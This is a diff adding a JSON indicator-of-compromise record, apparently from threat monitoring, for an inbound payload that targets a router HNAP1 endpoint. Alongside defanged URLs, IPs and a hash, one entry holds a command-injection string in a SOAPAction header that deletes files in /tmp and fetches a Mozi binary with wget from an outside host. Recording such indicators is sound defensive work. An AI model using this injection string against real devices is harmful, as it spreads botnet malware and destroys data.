@@ -1,0 +1,63 @@
+[
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://purenetworks[.]com/HNAP1/"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://www[.]w3[.]org/2001/XMLSchema-instance"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://www[.]w3[.]org/2001/XMLSchema"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://172[.]168[.]176[.]XXX:47500/Mozi.m"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://schemas[.]xmlsoap[.]org/soap/envelope/"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "190[.]179[.]160.XXX"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "172[.]168[.]176.XXX"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://172[.]168[.]176[.]XXX:47500/Mozi.m && chmod 777"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "a61b754f4d90ca6efb4aeff83951f5e0b633bedd6d7f9737bc8fb2bc10ac76b0"
+  },
+  {
+    "asn": "Galaxy Broadband",
+    "country": "Pakistan",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "103[.]74[.]21.XXX"
+  }
+]
